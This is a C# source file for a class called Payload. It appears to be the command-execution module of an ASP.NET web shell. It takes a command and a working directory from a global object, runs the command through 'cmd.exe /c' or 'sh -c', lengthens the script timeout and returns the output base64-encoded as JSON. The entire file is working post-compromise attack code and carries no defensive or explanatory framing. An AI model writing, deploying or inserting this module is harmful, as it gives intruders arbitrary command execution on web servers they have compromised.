using System.Globalization;
using System;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Runtime.Serialization;
using System.Web;
public class Payload
{
    [DataContract]
    class Ret
    {
        [DataMember]
        public int code = 1;

        [DataMember]
        public string result = "";
    }
    Ret ret;
    public string Run()//global: pwd, cmd, shell
    {
        HttpContext.Current.Server.ScriptTimeout = 3600;
        ret = new Ret();
        try
        {
            Process p = new Process();
            ProcessStartInfo pinfo = p.StartInfo;
            pinfo.RedirectStandardOutput = true;
            pinfo.RedirectStandardError = true;
            pinfo.UseShellExecute = false;
            pinfo.WorkingDirectory = Global.pwd;
            if (Global.shell == "shell")
            {
                if(Environment.OSVersion.Platform == PlatformID.Unix){
                    pinfo.FileName = "sh";
                    pinfo.Arguments = "-c " + Global.cmd;
                }else{
                    pinfo.FileName = "cmd.exe";
                    pinfo.Arguments = "/c " + Global.cmd;
                }
            }
            else
            {
                pinfo.FileName = Global.cmd;
            }
            p.Start();
            //p.WaitForExit();
            StreamReader stmrdr_output = p.StandardOutput;
            StreamReader stmrdr_errors = p.StandardError;
            string output = "";
            string stand_out = stmrdr_output.ReadToEnd();
            string stand_errors = stmrdr_errors.ReadToEnd();
            stmrdr_output.Close();
            stmrdr_errors.Close();
            p.Close();
            if (!String.IsNullOrEmpty(stand_out))
                output = output + stand_out;
            if (!String.IsNullOrEmpty(stand_errors))
                output = output + stand_errors;
            ret.result = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
            ret.code = 1;
            return Global.json_encode(ret);
        }
        catch (Exception e)
        {
            ret.code = -1;
            ret.result = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(e.ToString()));
            return Global.json_encode(ret);
        }

    }
}